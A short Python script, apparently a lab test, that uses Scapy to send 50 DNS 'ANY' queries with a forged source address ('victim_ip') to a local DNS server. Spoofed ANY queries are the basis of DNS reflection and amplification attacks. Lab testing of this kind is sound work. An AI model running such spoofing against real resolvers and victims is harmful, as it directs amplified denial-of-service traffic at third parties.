from scapy.all import *
import time  

def spoof_batch():
    iface = "Wi-Fi"
    victim_ip = "192.168.1.200"      # fake IP
    dns_server = "192.168.196.1"     # your machine's IP
    
    for i in range(50):
        pkt = Ether()/IP(src=victim_ip, dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.local", qtype=255))
        sendp(pkt, iface=iface, verbose=False)
        print(f"[+] Sent spoofed ANY query #{i+1}")
        time.sleep(0.05)

spoof_batch()
